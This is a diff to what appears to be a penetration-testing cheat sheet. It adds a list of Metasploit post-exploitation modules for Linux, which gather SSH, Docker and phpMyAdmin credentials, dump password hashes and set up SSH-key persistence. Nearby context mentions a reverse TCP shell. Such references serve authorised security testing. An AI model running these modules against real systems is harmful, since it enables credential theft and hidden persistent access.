@@ -2582,6 +2582,19 @@ set HANDLER true
 set LHOST <host-ip>
 run
 ```
+### Linux post exploitation module II
+
+```msfconsole
+post/multi/gather/ssh_creds
+post/multi/gather/docker_creds
+post/linux/gather/hashdump
+post/linux/gather/ecryptfs_creds
+post/linux/gather/enum_psk
+post/linux/gather/enum_xchat
+post/linux/gather/phpmyadmin_credsteal
+post/linux/gather/pptpd_chap_secrets
+post/linux/manage/sshkey_persistence
+```
 
 > This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.
 
